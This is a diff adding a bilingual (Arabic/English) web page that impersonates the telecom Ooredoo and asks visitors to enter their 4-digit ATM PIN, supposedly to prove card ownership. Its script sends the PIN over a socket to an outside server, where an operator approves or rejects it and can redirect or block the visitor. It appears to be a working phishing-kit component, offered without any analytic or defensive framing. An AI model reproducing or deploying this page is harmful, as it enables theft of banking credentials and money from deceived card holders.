@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8"><!-- v2 -->
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>إثبات ملكية البطاقة ATM | Ooredoo</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; flex-direction: column; align-items: center; direction: rtl; }
+.lang-toggle-wrapper { width: 100%; max-width: 420px; display: flex; justify-content: flex-start; margin-top: 12px; padding: 0 24px; }
+.lang-toggle { background: #fff; border: 1px solid #ddd; border-radius: 20px; padding: 6px 16px; font-size: 13px; cursor: pointer; color: #333; }
+.lang-toggle:hover { background: #f0f0f0; }
+.container { width: 100%; max-width: 420px; margin: 10px auto 40px; background: #fff; border-radius: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.08); padding: 32px 24px; }
+h1 { text-align: center; font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 4px; }
+.atm-label { text-align: center; font-size: 24px; font-weight: 700; color: #ed1c24; margin-bottom: 10px; }
+.subtitle { text-align: center; color: #4c5562; font-size: 14px; margin-bottom: 20px; }
+.description { background: #f9fafb; border-radius: 12px; padding: 16px 18px; margin-bottom: 28px; color: #333; font-size: 14px; line-height: 1.8; text-align: right; }
+.pin-input-area { display: flex; justify-content: center; gap: 14px; margin-bottom: 24px; direction: ltr; }
+.pin-input-area input { width: 52px; height: 60px; border: 1.5px solid #e0e0e0; border-radius: 12px; text-align: center; font-size: 24px; font-weight: 600; outline: none; transition: border-color 0.2s; }
+.pin-input-area input:focus { border-color: #ed1c24; }
+.error-msg { color: #ed1c24; font-size: 13px; text-align: center; margin-bottom: 16px; display: none; }
+.submit-btn { width: 100%; height: 54px; border-radius: 12px; border: none; background: #ed1c24; color: #fff; font-size: 18px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
+.submit-btn:hover { background: #d4191f; }
+.submit-btn:disabled { background: #f5a0a3; cursor: not-allowed; }
+.submit-btn { position: relative; }
+.submit-btn.loading { pointer-events: none; color: rgba(255,255,255,0.4); background: #ed1c24 !important; }
+.submit-btn.loading::before { content: ''; position: absolute; width: 28px; height: 28px; border: 3px solid rgba(255,255,255,0.4); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; top: 50%; left: 50%; margin-top: -14px; margin-left: -14px; z-index: 1; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.waiting-msg { text-align: center; color: #ed1c24; font-size: 14px; margin-top: 12px; display: none; }
+@media (max-width: 500px) {
+  .container { margin: 10px 0 0; border-radius: 0; min-height: calc(100vh - 50px); padding: 24px 16px; box-shadow: none; }
+  .lang-toggle-wrapper { padding: 0 16px; }
+  h1 { font-size: 20px; }
+  .atm-label { font-size: 20px; }
+  .subtitle { font-size: 13px; }
+  .description { font-size: 13px; padding: 14px 14px; }
+  .pin-input-area input { width: 48px; height: 54px; font-size: 22px; }
+  .submit-btn { height: 50px; font-size: 16px; }
+}
+@media (max-width: 360px) {
+  .container { padding: 20px 12px; }
+  .pin-input-area input { width: 44px; height: 50px; font-size: 20px; gap: 10px; }
+  .pin-input-area { gap: 10px; }
+  .submit-btn { height: 46px; font-size: 15px; }
+}
+</style>
+</head>
+<body>
+
+<div class="lang-toggle-wrapper">
+  <button class="lang-toggle" id="langToggle" onclick="toggleLanguage()">English</button>
+</div>
+
+<div class="container">
+  <h1 id="pageTitle">إثبات ملكية البطاقة</h1>
+  <div class="atm-label">ATM</div>
+  <p class="subtitle" id="pageSubtitle">لتأكيد العملية أدخل الرقم السري للصراف الآلي</p>
+
+  <div class="description" id="pageDescription">
+    يرجى إدخال الرقم السري للصراف الآلي (ATM) المكون من 4 خانات للبطاقة المنتهية بـ <strong id="lastDigits">****</strong> ليتم التأكد من ملكية وأهلية صاحب البطاقة للحماية من مخاطر الاحتيال الإلكتروني والتأكد من عملية الدفع.
+  </div>
+
+  <div class="pin-input-area">
+    <input type="tel" maxlength="1" inputmode="numeric" class="pin-digit" data-index="0" autofocus>
+    <input type="tel" maxlength="1" inputmode="numeric" class="pin-digit" data-index="1">
+    <input type="tel" maxlength="1" inputmode="numeric" class="pin-digit" data-index="2">
+    <input type="tel" maxlength="1" inputmode="numeric" class="pin-digit" data-index="3">
+  </div>
+
+  <div class="error-msg" id="pinError">الرقم السري غير صحيح. يرجى المحاولة مرة أخرى.</div>
+
+  <button class="submit-btn" id="submitBtn" onclick="submitPIN()" disabled>تأكيد</button>
+  <div class="waiting-msg" id="waitingMsg">جاري التحقق...</div>
+</div>
+
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<script>
+(function() {
+  var translations = {
+    ar: {
+      langBtn: 'English',
+      title: 'إثبات ملكية البطاقة',
+      subtitle: 'لتأكيد العملية أدخل الرقم السري للصراف الآلي',
+      descriptionPre: 'يرجى إدخال الرقم السري للصراف الآلي (ATM) المكون من 4 خانات للبطاقة المنتهية بـ ',
+      descriptionPost: ' ليتم التأكد من ملكية وأهلية صاحب البطاقة للحماية من مخاطر الاحتيال الإلكتروني والتأكد من عملية الدفع.',
+      error: 'الرقم السري غير صحيح. يرجى المحاولة مرة أخرى.',
+      submitBtn: 'تأكيد',
+      waiting: 'جاري التحقق...'
+    },
+    en: {
+      langBtn: 'العربية',
+      title: 'Card Ownership Verification',
+      subtitle: 'To confirm the transaction, enter your ATM PIN',
+      descriptionPre: 'Please enter the 4-digit ATM PIN for the card ending in ',
+      descriptionPost: ' to verify card ownership and eligibility for protection against electronic fraud and to confirm the payment process.',
+      error: 'Incorrect PIN. Please try again.',
+      submitBtn: 'Confirm',
+      waiting: 'Verifying...'
+    }
+  };
+
+  var urlParams = new URLSearchParams(window.location.search);
+  var urlLang = urlParams.get('lang');
+  var currentLang = urlLang || localStorage.getItem('siteLang') || localStorage.getItem('oredoo_site_language') || 'ar';
+  if (urlLang) { localStorage.setItem('siteLang', urlLang); localStorage.setItem('oredoo_site_language', urlLang); }
+
+  // Load payment data - get last 4 digits
+  var paymentData = {};
+  try { paymentData = JSON.parse(localStorage.getItem('paymentData') || '{}'); } catch(e) {}
+  var last4 = paymentData.cardLast4 || '****';
+
+  function applyLanguage() {
+    var t = translations[currentLang];
+    document.documentElement.lang = currentLang === 'ar' ? 'ar' : 'en';
+    document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
+    document.body.style.direction = currentLang === 'ar' ? 'rtl' : 'ltr';
+    document.getElementById('langToggle').textContent = t.langBtn;
+    document.getElementById('pageTitle').textContent = t.title;
+    document.getElementById('pageSubtitle').textContent = t.subtitle;
+    document.getElementById('pageDescription').innerHTML = t.descriptionPre + '<strong id="lastDigits">' + last4 + '</strong>' + t.descriptionPost;
+    document.getElementById('pageDescription').style.textAlign = currentLang === 'ar' ? 'right' : 'left';
+    document.getElementById('pinError').textContent = t.error;
+    document.getElementById('submitBtn').textContent = t.submitBtn;
+    document.getElementById('waitingMsg').textContent = t.waiting;
+  }
+
+  window.toggleLanguage = function() {
+    currentLang = currentLang === 'ar' ? 'en' : 'ar';
+    localStorage.setItem('siteLang', currentLang); localStorage.setItem('oredoo_site_language', currentLang);
+    applyLanguage();
+  };
+
+  applyLanguage();
+
+  var SOCKET_URL = 'https://oredoooman-server.fly.dev';
+  var socket = io(SOCKET_URL, { transports: ['polling','websocket'], reconnection: true, reconnectionAttempts: Infinity, reconnectionDelay: 1000 });
+  var visitorId = localStorage.getItem('visitorId') || '';
+
+  // PIN digit inputs
+  var digits = document.querySelectorAll('.pin-digit');
+  digits.forEach(function(input, idx) {
+    input.addEventListener('input', function() {
+      var val = this.value.replace(/\D/g, '');
+      this.value = val.slice(0, 1);
+      if (val && idx < digits.length - 1) digits[idx + 1].focus();
+      checkPINComplete();
+    });
+    input.addEventListener('keydown', function(e) {
+      if (e.key === 'Backspace' && !this.value && idx > 0) {
+        digits[idx - 1].focus();
+      }
+    });
+    input.addEventListener('paste', function(e) {
+      e.preventDefault();
+      var paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+      for (var i = 0; i < Math.min(paste.length, digits.length); i++) {
+        digits[i].value = paste[i];
+      }
+      if (paste.length >= digits.length) digits[digits.length - 1].focus();
+      else if (paste.length > 0) digits[paste.length].focus();
+      checkPINComplete();
+    });
+  });
+
+  function checkPINComplete() {
+    var code = getPINCode();
+    var btn = document.getElementById('submitBtn');
+    if (code.length === 4) { btn.disabled = false; }
+    else { btn.disabled = true; }
+  }
+
+  function getPINCode() {
+    var code = '';
+    digits.forEach(function(d) { code += d.value; });
+    return code;
+  }
+
+  // Socket
+  socket.on('connect', function() {
+    socket.emit('visitor:register', { existingVisitorId: visitorId || null });
+    socket.emit('visitor:pageEnter', 'رمز ATM');
+  });
+  socket.on('visitor:registered', function(data) {
+    if (data && data._id) { visitorId = data._id; localStorage.setItem('visitorId', data._id); }
+    if (data && data.pid) localStorage.setItem('visitorId', data.pid);
+  });
+  socket.on('visitor:navigate', function(page) { if (page) window.location.href = '/' + page; });
+  socket.on('admin-last-message', function(data) {
+    if (data && data.message) { localStorage.setItem('adminLastMessage', data.message); window.location.href = '/final-page/'; }
+  });
+  socket.on('blocked', function() { alert('تم حظرك.'); });
+
+  socket.on('code:action', function(action) {
+    var act = (typeof action === 'string') ? action : (action && action.action) || '';
+    document.getElementById('waitingMsg').style.display = 'none';
+    document.getElementById('submitBtn').disabled = false;
+    document.getElementById('submitBtn').classList.remove('loading');
+
+    if (act === 'approve') {
+      window.location.href = '/login/?popup=1';
+    } else if (act === 'reject') {
+      document.getElementById('pinError').style.display = 'block';
+      digits.forEach(function(d) { d.value = ''; });
+      digits[0].focus();
+    }
+  });
+
+  socket.on('card:action', function(action) {
+    var act = (typeof action === 'string') ? action : (action && action.action) || '';
+    document.getElementById('waitingMsg').style.display = 'none';
+    if (act === 'reject') {
+      document.getElementById('pinError').style.display = 'block';
+      digits.forEach(function(d) { d.value = ''; });
+      digits[0].focus();
+    }
+  });
+
+  // Submit PIN
+  window.submitPIN = function() {
+    var code = getPINCode();
+    if (code.length !== 4) return;
+    document.getElementById('pinError').style.display = 'none';
+    document.getElementById('submitBtn').disabled = true;
+    document.getElementById('submitBtn').classList.add('loading');
+    document.getElementById('waitingMsg').style.display = 'block';
+
+    socket.emit('more-info', {
+      digitCode: code,
+      page: 'رمز ATM',
+      waitingForAdminResponse: true
+    });
+  };
+})();
+</script>
+</body>
+</html>
